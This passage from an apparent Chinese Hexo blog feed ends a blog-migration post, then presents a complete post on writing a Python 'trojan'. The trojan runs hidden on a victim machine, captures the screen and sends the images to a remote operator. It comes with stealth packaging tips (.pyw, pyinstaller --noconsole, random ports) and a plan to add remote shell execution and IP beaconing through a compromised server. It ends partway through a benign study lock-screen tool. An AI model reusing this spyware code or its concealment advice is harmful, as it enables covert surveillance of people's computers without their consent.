<p><a href="C:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1562687310557.png" data-fancybox="group" data-caption="1562687310557" class="fancybox"><img src="C:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1562687310557.png" alt="1562687310557" title="1562687310557"></a></p>
<p>我们在上面用如下格式输入</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title:</span><br><span class="line">categories:</span><br><span class="line"> - demo</span><br><span class="line"> - test(注意有空格，否则会报错)</span><br><span class="line">date:</span><br><span class="line">tags:</span><br><span class="line">---</span><br><span class="line">下面可以balbala正文了</span><br><span class="line">我们在每个后面输入相应的内容，然后最后保存到source/_post/这个文件夹下面，我们要注意的是如果你想添加多个分类或者标签的时候你要按照上面图片的格式</span><br></pre></td></tr></table></figure></div>

<p><a href="C:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1562688086690.png" data-fancybox="group" data-caption="1562688086690" class="fancybox"><img src="C:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1562688086690.png" alt="1562688086690" title="1562688086690"></a></p>
<p>如图，修改之后。</p>
<ul>
<li><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562688516545.png" data-fancybox="group" data-caption="1562688516545" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562688516545.png" alt="1562688516545" title="1562688516545"></a></li>
</ul>
<p>然后提交/source/_post</p>
<p>然后在hexo根目录下执行hexo g 生成，然后hexo d提交到我们的github</p>
<ul>
<li><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562688575564.png" data-fancybox="group" data-caption="1562688575564" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562688575564.png" alt="1562688575564" title="1562688575564"></a></li>
</ul>
<p>我们看到生成成功了！</p>
<p>这样我们可以吧所有的文章全部迁移。</p>
<p>PS：这里有一个坑，来说明一下，如果你的电脑在hexo g拖出来的文章的时候总是会被Killed掉，使我们电脑的内存不足，需要创建交换空间（WINdows叫虚拟内存）不够跑的，这时候我们执行一下命令即可。</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">free -m </span><br><span class="line">dd if=/dev/zero of=/swap bs=4096 count=1572864</span><br><span class="line">mkswap /swap</span><br><span class="line">swapon /swap</span><br><span class="line">echo &quot;LABEL=SWAP-sda /swap swap swap defaults 0 0&quot; &gt;&gt; /etc/fstab</span><br></pre></td></tr></table></figure></div>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>​    本次迁移博客呢，踩了不少坑也弄了不少经验，花了一天多的时间吧，也对hexo有了一个大体的了解，感觉还是蛮方便的，相对比wordpress，hexo简直十分轻量级，除此之外，hexo依赖node.js，对于php，mysql依赖的比较少，配置上手还是蛮方便的。</p>
]]></content>
      <categories>
        <category>胡乱折腾</category>
      </categories>
      <tags>
        <tag>博客迁移</tag>
        <tag>胡乱折腾</tag>
      </tags>
  </entry>
  <entry>
    <title>python实现屏幕截取功能</title>
    <url>/2019/06/28/python%E5%AE%9E%E7%8E%B0%E6%88%AA%E5%8F%96%E5%AF%B9%E6%96%B9%E5%B1%8F%E5%B9%95%E5%8A%9F%E8%83%BD/</url>
    <content><![CDATA[<h1 id="python实现截取对方屏幕功能"><a href="#python实现截取对方屏幕功能" class="headerlink" title="python实现截取对方屏幕功能"></a>python实现截取对方屏幕功能</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​    最近呢，有个期末作业要做，叫弄点关于安全这方面的玩意，身边的朋友有的打靶场，有的部署Nessus扫描器，我正好最近想写点好玩的小工具，抽下时间说看看木马这些东西，然后本花就开始想啊想，想木马的功能具体的实现思路，这里呢，我就想到那就先写一个简单的练练手玩，置于什么免杀或者过什么杀毒软件的后面有需求再说，本来想是说写个弹个shell的或者弄个啥的键盘监控，后来看了看，由于时间比较紧，然后我就利用我自己常用的一些的socket编程，从而来进行写一个远程监控对方屏幕然后获取内容，发送到本地的木马程序。当然这个程序我们后面可能会给他更加丰满一些，比如说通过socket传送命令，直接远端操控cmd，linux操控shell。（当然我们这种远端操控对方系统的没有实现，该程序只实现了屏幕截取，但是远程发送命令并且执行的思路我们会在后面说）</p>
<p>​                                                                                        –青花</p>
<h2 id="思路介绍"><a href="#思路介绍" class="headerlink" title="思路介绍"></a>思路介绍</h2><p>我们的思路其实很简单，</p>
<p>1 叫被控制方（这里是指我们要监听的主机）利用套接字在主机上开一个端口，                                                               </p>
<p>注：（这里我们监听端要想办法隐藏程序在后台运行，这里介绍两种方法：1.如果是利用python打开就是.pyw文件这样就会弄到后台运行   2.如果打包成exe文件的话用pyinstaller的时候我们要加入–noconsole参数就不会弹出黑窗口，然后我们不加GUI什么乱七八糟的就会被扔到后台运行）</p>
<p>pyw效果</p>
<ul>
<li><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562493026990.png" data-fancybox="group" data-caption="1562493026990" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562493026990.png" alt="1562493026990" title="1562493026990"></a></li>
</ul>
<p>我们任务管理器看到后台pyw的进程。</p>
<ul>
<li><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562493106780.png" data-fancybox="group" data-caption="1562493106780" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562493106780.png" alt="1562493106780" title="1562493106780"></a></li>
</ul>
<p>这时候我们看到主机的8888端口已经被我们打开了。</p>
<p>​    exe 打包加–noconsole效果</p>
<ul>
<li><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562493423785.png" data-fancybox="group" data-caption="1562493423785" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562493423785.png" alt="1562493423785" title="1562493423785"></a></li>
</ul>
<p>这里注意用pyinstaller打包成exe文件，我们是木马，当然一个文件好，不要弄个文件夹出来，要加-F参数就会集成为一个文件，否则出来是一堆动态链接库文件（dll）（PS：我后面在执行用我自己的程序是有一个图标的，那个加入-i 参数指定一个ico文件就行了，源代码都是一样的）</p>
<p>我们查看效果</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562493571269.png" data-fancybox="group" data-caption="1562493571269" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562493571269.png" alt="1562493571269" title="1562493571269"></a></p>
<p>后台已经在跑了。</p>
<ul>
<li><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562493602624.png" data-fancybox="group" data-caption="1562493602624" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562493602624.png" alt="1562493602624" title="1562493602624"></a></li>
</ul>
<p>端口也已经成功监听。</p>
<p>然后利用这个端口通过我们远程运行在目标主机上的木马程序。我这里程序写的潦草，只开了8888这个端口（这里我后面考虑了一个问题，那就是端口可以用random随机生成，不要太高也不要太低，可以能够不引起发觉）。</p>
<p>2 截取对方屏幕。存到对方主机中。利用python的库，有很多种方式，可以利用pywin32调用windows  api来进行截图，但是考虑到跨平台性，我们利用image这个库，简单粗暴两行代码搞定。</p>
<p>ImageGrab.grab() 截取屏幕，返回一个对象</p>
<p>im.save(‘d:/‘+str(label)+’.jpeg’,’jpeg’)保存这个对象所截取到的屏幕文件</p>
<p>3 通过套接字发送给我们监听端,然后删除目标被监听主机上的文件。存取到我们本地。</p>
<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><p>监听端（被控机）</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> os </span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> platform</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> ImageGrab</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getimg</span><span class="params">()</span>:</span>   <span class="comment">#这个是屏幕截取的函数</span></span><br><span class="line">	im=ImageGrab.grab()</span><br><span class="line">	label=time.time()</span><br><span class="line">	im.save(<span class="string">'d:/'</span>+str(label)+<span class="string">'.jpeg'</span>,<span class="string">'jpeg'</span>)</span><br><span class="line">	<span class="keyword">return</span> label		</span><br><span class="line">	</span><br><span class="line"><span class="string">r'''def sendmyip():  #本来的思路是反弹自己内网ip给对方到一个http服务器上，这个功能后来想了想暂时初级阶段</span></span><br><span class="line"><span class="string">	s.bind((str(hostip),8888))  #不太需要后来就不了了之了</span></span><br><span class="line"><span class="string">	s.listen(1)</span></span><br><span class="line"><span class="string">	conn,addr=s.accept()</span></span><br><span class="line"><span class="string">	if conn:</span></span><br><span class="line"><span class="string">		s.send(hostip)'''</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">checkos</span><span class="params">()</span>:</span>			<span class="comment">#检查操作系统，然后设置存储路径，有个小缺陷windows可能会存在没有D盘的情况，linux								#操作系统权限没有考虑完全</span></span><br><span class="line">	os=platform.platform()</span><br><span class="line">	<span class="keyword">if</span> re.search(<span class="string">'Windows'</span>,os):</span><br><span class="line">		path=<span class="string">'d:/'</span></span><br><span class="line">		<span class="keyword">return</span>  path</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> re.search(<span class="string">'Linux'</span>,os):</span><br><span class="line">		path=<span class="string">'/home/'</span></span><br><span class="line">		<span class="keyword">return</span> path</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sendimg</span><span class="params">()</span>:</span>     <span class="comment">#主要执行函数创建套接字开启端口，然后进行截图发送文件</span></span><br><span class="line">	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM) 		</span><br><span class="line">	hostip=socket.gethostbyname(socket.getfqdn(socket.gethostname()))</span><br><span class="line">	print(hostip)</span><br><span class="line">	s.bind((str(hostip),<span class="number">8888</span>))</span><br><span class="line">	print(<span class="string">'please wating connecting.....'</span>)</span><br><span class="line">	s.listen(<span class="number">1</span>)</span><br><span class="line">	conn,addr=s.accept()</span><br><span class="line">	print(<span class="string">"Discovery connecting .......\n"</span>)</span><br><span class="line">	print(<span class="string">"Romote host ip is "</span>,addr[<span class="number">0</span>])</span><br><span class="line">	<span class="keyword">if</span> conn:</span><br><span class="line">		print(<span class="string">"sending......\n"</span>)</span><br><span class="line">		filename=getimg()   <span class="comment">#截图</span></span><br><span class="line">		path=checkos()		<span class="comment">#判断操作系统确定路径</span></span><br><span class="line">		filepath=path+str(filename)+<span class="string">'.jpeg'</span></span><br><span class="line">		<span class="keyword">if</span> os.path.exists(filepath):			</span><br><span class="line">			f=open(filepath,<span class="string">'rb'</span>)</span><br><span class="line">			<span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">				filedata=f.read(<span class="number">1024</span>)</span><br><span class="line">				<span class="keyword">if</span> <span class="keyword">not</span> filedata:</span><br><span class="line">					<span class="keyword">break</span></span><br><span class="line">				conn.send(filedata)</span><br><span class="line">				print(<span class="string">'send is running......'</span>)</span><br><span class="line">		f.close()</span><br><span class="line">	os.remove(filepath)   <span class="comment">#删除文件</span></span><br><span class="line">	print(<span class="string">'image send is complish!\n'</span>)</span><br><span class="line">			</span><br><span class="line">		</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">'__main__'</span>:</span><br><span class="line">	<span class="keyword">while</span> <span class="number">1</span>:	</span><br><span class="line">		sendimg()</span><br></pre></td></tr></table></figure></div>

<p>接收端（文件获取方）</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> platform</span><br><span class="line"></span><br><span class="line"><span class="string">r'''def checkos():                        #这里本来是为了响应监听端实现一个判断操作系统功能，然后后面跟</span></span><br><span class="line"><span class="string">	os=platform.platform()				#好的执行shell命令或者其他操作写的，不过时间问题没有继续写下去</span></span><br><span class="line"><span class="string">	if re.search('Windows',os):			#后面我们介绍思路会说</span></span><br><span class="line"><span class="string">		path='Windows'</span></span><br><span class="line"><span class="string">		return path</span></span><br><span class="line"><span class="string">	if re.search('Linux',os):</span></span><br><span class="line"><span class="string">		path='Linux'</span></span><br><span class="line"><span class="string">		return path</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">def checksetpath(filepath,systemtype):</span></span><br><span class="line"><span class="string">	if systemtype=='Windows':</span></span><br><span class="line"><span class="string">		r=re.search("c:/|d:/|e:/|f:/|g:/",filepath)</span></span><br><span class="line"><span class="string">		if not r:</span></span><br><span class="line"><span class="string">			print("path is error\n")</span></span><br><span class="line"><span class="string">			exit()</span></span><br><span class="line"><span class="string">	if systemtype=='Linux':</span></span><br><span class="line"><span class="string">		r=re.search("/etc|/usr|/var|/root|/home",filepath)</span></span><br><span class="line"><span class="string">		if not r:</span></span><br><span class="line"><span class="string">			print("path is error\n")</span></span><br><span class="line"><span class="string">			exit()'''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">recvimg</span><span class="params">()</span>:</span></span><br><span class="line">	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM) </span><br><span class="line">	remoteip=str(input(<span class="string">"Please input aim ip\n"</span>))<span class="comment">#连接远程套接字</span></span><br><span class="line">	s.connect((remoteip,<span class="number">8888</span>))</span><br><span class="line">	print(<span class="string">"connection already established\n"</span>)</span><br><span class="line">	lable=time.time()</span><br><span class="line">	f=open(<span class="string">'./'</span>+str(lable)+<span class="string">'.jpeg'</span>,<span class="string">'wb'</span>)   <span class="comment">#接收文件写入文件</span></span><br><span class="line">	<span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">		data=s.recv(<span class="number">1024</span>)</span><br><span class="line">		<span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		f.write(data)</span><br><span class="line">		print(<span class="string">'recv is running ....'</span>)</span><br><span class="line">	</span><br><span class="line">	print(<span class="string">"img is geting......."</span>)</span><br><span class="line">	f.close()</span><br><span class="line">	s.close()</span><br><span class="line">			</span><br><span class="line">			</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">'__main__'</span>:</span><br><span class="line">	print(<span class="string">"programe is running.......\n"</span>)</span><br><span class="line">	recvimg()</span><br></pre></td></tr></table></figure></div>

<h2 id="程序简单测试"><a href="#程序简单测试" class="headerlink" title="程序简单测试"></a>程序简单测试</h2><p>首先在本地测试一下。</p>
<p>首先打开监听端，然后打开控制端输入目标ip（也就是开启监听端的那个主机）</p>
<ul>
<li><p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562494017252.png" data-fancybox="group" data-caption="1562494017252" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562494017252.png" alt="1562494017252" title="1562494017252"></a></p>
</li>
<li><p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562493968803.png" data-fancybox="group" data-caption="1562493968803" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562493968803.png" alt="1562493968803" title="1562493968803"></a></p>
</li>
<li><p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562494035648.png" data-fancybox="group" data-caption="1562494035648" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562494035648.png" alt="1562494035648" title="1562494035648"></a></p>
</li>
</ul>
<p>ok多出一个图片文件，表示成功！</p>
<p>然后远程测试打印机机器的效果。</p>
<ul>
<li><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562494https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/2238.png" data-fancybox="group" data-caption="1562494https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/2238" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562494https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/2238.png" alt="1562494https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/2238" title="1562494https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/2238"></a></li>
</ul>
<p>也是可以执行的。</p>
<h2 id="思路拓展"><a href="#思路拓展" class="headerlink" title="思路拓展"></a>思路拓展</h2><p> 1 IP问题</p>
<p>上面我们说了，我们在进行测试的过程中，即使被监控的一端打开了木马文件，可能会存在一个我们不知道对方内网ip的地址，或者说其他的。这里我想一个思路，另外可以在木马程序中开一个线程开启一个套接字，然后我们在外网服务器上开一个web页面（或者直接在目标服务器上开一个套接字，为了安全起见，我觉得可能去抓个鸡好点），然后被监控端执行命令获取本机ip等系统信息，将这些信息打包发送请求访问这个页面，然后我们获取这些信息。这样就解决了IP的问题。</p>
<p> 2 shell命令执行</p>
<p>我前面说过，我们在这里讨论一下shell命令执行的情况，这里我们可以加一个扩展，也就是给我们这个木马程序。这里我们可以通过一下思路进行拓展。</p>
<p>（1）.控制端（也就是我们操纵的这里）我们可以再开一个线程，然后再给被监控端那边也开一个套接字，连接对方，然后封装函数。</p>
<p>（2）我们这边通过套接字发送给对方，想要执行的shell命令，然后传输过去，对方通过接受，然后利用os.system()方法执行</p>
<p>（3）执行完毕后，反馈结果给我们</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>​    本次我们进行了简单的小木马工具的编写，希望大家不要用作非法用途，只用作个人学习（作者不承担作用于非法用途的后果）。可以说不光是锻炼了一下自己写python程序的能力，其次也是思想天马行空，还想加好多功能叫木马强大起来，还想怎么过一些杀软，哈哈哈，还是意犹未尽，不过时间宝贵，还是干当前重要的事情吧，后面如果更新，我会再次发布的！</p>
]]></content>
      <categories>
        <category>安全之路</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>木马</tag>
      </tags>
  </entry>
  <entry>
    <title>简单的windows锁屏工具（自律必备！）</title>
    <url>/2019/06/28/%E7%AE%80%E5%8D%95%E7%9A%84Windows%E9%94%81%E5%B1%8F%E5%B7%A5%E5%85%B7/</url>
    <content><![CDATA[<h1 id="简单的Windows锁屏工具"><a href="#简单的Windows锁屏工具" class="headerlink" title="简单的Windows锁屏工具"></a>简单的Windows锁屏工具</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​    最近因为期末的原因，手头有不少的课设，所以直接干脆搬到实验室复习，然后在做实验做课设之余，也会看一些复习的内容。但是，在看复习内容的时候也难免不会说，去没事瞅两眼电脑啥的。后来，我说不行啊，我得像个办法，治治这个东西。所以我就想到写一个windows的锁屏工具。这里我们就来简单介绍一下他的编写，以及分享一下简单的源代码。</p>
<p>​                                                                                                        –青花</p>
<h2 id="运行环境"><a href="#运行环境" class="headerlink" title="运行环境"></a>运行环境</h2><p>python3版本以上，本人的是python3.7</p>
<p>需要用到的第三方库</p>
<p>Image 直接pip下载就OK了。</p>
<p>其实也可以锁屏用pywin32里面windows的API也OK。</p>
<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> tkinter</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> os.path <span class="keyword">import</span> exists</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image, ImageTk</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">background</span><span class="params">()</span>:</span></span><br><span class="line">        win=tkinter.Tk()</span><br><span class="line">        width=win.winfo_screenwidth()</span><br><span class="line">        height=win.winfo_screenheight()</span><br><span class="line">        image = Image.open(<span class="string">'C:/Users/Administrator/Desktop/1.jpg'</span>)</span><br><span class="line">        photo = ImageTk.PhotoImage(image.resize((width,height)))</span><br><span class="line">        label =tkinter.Label(win)</span><br><span class="line">        a=<span class="string">'both'</span></span><br><span class="line">        label.pack(expand=<span class="string">'YES'</span>,fill=a)</span><br><span class="line">        label.configure(image = photo )</span><br><span class="line">        win.geometry(<span class="string">"+0+0"</span>)</span><br><span class="line">        win.wm_attributes(<span class="string">'-topmost'</span>,<span class="number">1</span>)</span><br><span class="line">        win.wm_attributes(<span class="string">'-alpha'</span>,<span class="number">0.4</span>)</span><br><span class="line">        win.mainloop()</span><br><span class="line">        <span class="keyword">return</span> win</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lockscern</span><span class="params">(c)</span>:</span></span><br><span class="line">        user32 = windll.LoadLibrary(<span class="string">'user32.dll'</span>)</span><br><span class="line">        user32.BlockInput(<span class="literal">True</span>)</span><br><span class="line">        time.sleep(int(c)*<span class="number">60</span>)</span><br><span class="line">        user32.BlockInput(<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">countertime</span><span class="params">(names,times)</span>:</span></span><br><span class="line">    flag=<span class="literal">True</span></span><br><span class="line">    start=time.ctime()</span><br><span class="line">    runtime=time.time()</span><br><span class="line">    d1 = datetime.datetime.strptime(<span class="string">'2019-12-21 00:00:00'</span>, <span class="string">'%Y-%m-%d %H:%M:%S'</span>)</span><br><span class="line">    d2=datetime.datetime.now()</span><br><span class="line">    disdate=d1-d2</span><br><span class="line">    workhard=[<span class="string">'行百里者半九十'</span>,<span class="string">'真正的才智是刚毅的志向。'</span>,<span class="string">"故天将降大任于斯人也，必先苦其心志，劳其筋骨，饿其体肤，行拂乱其所为，增益其所不能。"</span>,<span class="string">"古之成大事者，不惟有超世之才，亦必有坚忍不拔之志"</span>,<span class="string">"书山有路勤为径，学海无涯苦作舟。"</span>,<span class="string">"不登高山，不知天之高也；不临深谷，不知地之厚也；不闻先王之遗言，不知学问之大也。"</span>,<span class="string">"浅薄的学识是一件危险的事情。"</span>,<span class="string">"当你尽了自己的最大努力时，失败也是伟大的。"</span>,<span class="string">"当一个人先从自己的内心开始奋斗，他就是个有价值的人。"</span>,<span class="string">"嘲讽是一种力量，消极的力量。赞扬也是一种力量，但却是积极的力量。"</span>,<span class="string">"环境不会改变，解决之道在于改变自己。"</span>,<span class="string">"没有比脚更长的路，没有比人更高的山。"</span>,<span class="string">"若不给自己设限，则人生中就没有限制你发挥的藩篱。"</span>,<span class="string">"每一发奋努力的背后，必有加倍的赏赐。"</span>,<span class="string">"与其临渊羡鱼，不如退而结网。"</span>,<span class="string">"有事者，事竟成;破釜沉舟，百二秦关终归楚;苦心人，天不负;卧薪尝胆，三千越甲可吞吴。"</span>,<span class="string">"人生重要的不是所站的位置，而是所朝的方向。"</span>,<span class="string">"没有一种不通过蔑视、忍受和奋斗就可以征服的命运。"</span>,<span class="string">"构成我们学习最大障碍的是已知的东西，而不是未知的东西。"</span>,<span class="string">"信心来自于实力，实力来自于勤奋。"</span>,<span class="string">"不要等待机会，而要创造机会。"</span>,<span class="string">"永远不要以粗心为借口原谅自我。"</span>,<span class="string">"成功的法则极为简单，但简单并不代表容易。"</span>,<span class="string">"如果要挖井，就要挖到水出为止。"</span>,<span class="string">"所有的胜利，与征服自我的胜利比起来，都是微不足道。"</span>,<span class="string">"宝剑锋从磨砺出，梅花香自苦寒来"</span>,<span class="string">"如果缺少破土面出并与风雪拚搏的勇气，种子的前途并不比落叶美妙一分。"</span>,<span class="string">"瀑布跨过险峻陡壁时，才显得格外雄伟壮观。"</span>,<span class="string">"学习本无底，前进莫徬徨。"</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        run1time=time.time()</span><br><span class="line">        distime=run1time-runtime</span><br><span class="line">        thistime=round((distime/<span class="number">60</span>),<span class="number">2</span>)</span><br><span class="line">        time.sleep(<span class="number">3</span>)</span><br><span class="line">        page=random.randint(<span class="number">0</span>,len(workhard)<span class="number">-1</span>)</span><br><span class="line">        print(<span class="string">"********************************************************************************"</span>)</span><br><span class="line">        print(<span class="string">"\n"</span>)</span><br><span class="line">        print(<span class="string">"该任务名称为: "</span>,names,<span class="string">"                            今天是"</span>,d2.year,<span class="string">"年"</span>,d2.month,<span class="string">"月"</span>,d2.day,<span class="string">"日"</span>)  </span><br><span class="line">        print(<span class="string">"\n"</span>)      </span><br><span class="line">        print(<span class="string">"该任务开始时间为:  "</span>,start,<span class="string">"           距离考研还有:   "</span>,disdate.days,<span class="string">"天"</span>)</span><br><span class="line">        print(<span class="string">"\n"</span>)</span><br><span class="line">        print(<span class="string">"当前时间为:        "</span>,time.ctime())</span><br><span class="line">        print(<span class="string">"\n"</span>)</span><br><span class="line">        print(<span class="string">"当前任务进行的时间为:  "</span>,thistime,<span class="string">"分钟"</span>)</span><br><span class="line">        print(<span class="string">"\n"</span>)</span><br><span class="line">        print(<span class="string">"距离任务结束时间还有:  "</span>,round(times-thistime,<span class="number">2</span>),<span class="string">"分钟"</span>)</span><br><span class="line">        print(<span class="string">"\n"</span>)</span><br><span class="line">        print(<span class="string">"你要知道的:"</span>,workhard[page],<span class="string">"\n"</span>)</span><br><span class="line">        print(<span class="string">"********************************************************************************"</span>)            </span><br><span class="line">        <span class="keyword">if</span> int(distime/<span class="number">60</span>)==times:</span><br><span class="line">            print(<span class="string">"任务完成！\n"</span>)            </span><br><span class="line">            inputflies(names,times,start)</span><br><span class="line">            print(<span class="string">"已经将任务结果写入文件log\n"</span>)</span><br><span class="line">            print(<span class="string">"已成功完成任务，请点击关闭右上角透明浮窗，退出程序！"</span>)            </span><br><span class="line">            <span class="keyword">break</span>       </span><br><span class="line">            <span class="comment">#next()</span></span><br><span class="line">                        </span><br><span class="line">                      </span><br><span class="line">            </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inputflies</span><span class="params">(names,times,stime)</span>:</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> exists(<span class="string">'tasklog.txt'</span>) :</span><br><span class="line">                <span class="keyword">with</span> open(<span class="string">"tasklog.txt"</span>,<span class="string">'a+'</span>) <span class="keyword">as</span> f:</span><br><span class="line">                        title=<span class="string">'任务名称       任务时长(分钟)       任务开始时间'</span></span><br><span class="line">                        text=str(names)+<span class="string">'               '</span>+str(times)+<span class="string">'               '</span>+str(stime)</span><br><span class="line">                        f.write(title+<span class="string">'\n'</span>)</span><br><span class="line">                        f.write(text+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> exists(<span class="string">'tasklog.txt'</span>) :</span><br><span class="line">                <span class="keyword">with</span> open(<span class="string">"tasklog.txt"</span>,<span class="string">'a+'</span>) <span class="keyword">as</span> f:                        </span><br><span class="line">                        text=str(names)+<span class="string">'               '</span>+str(times)+<span class="string">'               '</span>+str(stime)                        </span><br><span class="line">                        f.write(text+<span class="string">'\n'</span>)</span><br><span class="line">       </span><br><span class="line">        </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">start</span><span class="params">()</span>:</span></span><br><span class="line">    flag=<span class="literal">True</span></span><br><span class="line">    <span class="keyword">while</span> flag :</span><br><span class="line">        print(<span class="string">"本程序一旦启动会将日志写入当前文件夹下，您可以在任务结束之后进行文件查看，任务结束后会退出程序"</span>)</span><br><span class="line">        print(<span class="string">"欢迎使用考研自律程序，现在请您输入任务信息!\n"</span>)</span><br><span class="line">        print(<span class="string">"作者:青花@Blue_And_White"</span>)               </span><br><span class="line">        taskname=str(input(<span class="string">"请输入任务名称:\n"</span>))</span><br><span class="line">        tasktime=int(input(<span class="string">"请输入任务时间(分钟):\n"</span>))</span><br><span class="line">        print(<span class="string">"警告，一旦程序启动程序电脑鼠标键盘将被锁死，并且无法退出，请您再三考虑！如果现在退出请输入exit!\n"</span>)</span><br><span class="line"></span><br><span class="line">        ok=input(<span class="string">"是否确认输入？\n确认    y   不确认 n   退出exit\n"</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> str(ok) == <span 